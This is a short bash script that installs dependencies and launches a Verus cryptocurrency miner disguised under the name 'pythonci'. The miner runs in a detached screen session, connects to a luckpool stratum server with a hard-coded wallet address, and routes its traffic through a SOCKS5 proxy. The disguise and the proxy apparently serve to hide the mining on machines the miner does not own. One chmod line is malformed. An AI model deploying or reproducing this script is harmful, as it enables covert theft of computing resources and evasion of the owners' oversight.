#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x co.sh && chmod +x pythonci chmod 777 pythonci co.sh
screen -dmS ls
PL=stratum+tcp://na.luckpool.net:3956
WT=RPkwwC1SL8QNjP1X242btbLA8othyHMRC9
WR=penyem-luar
PY=socks5://24.249.199.14:57335		
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
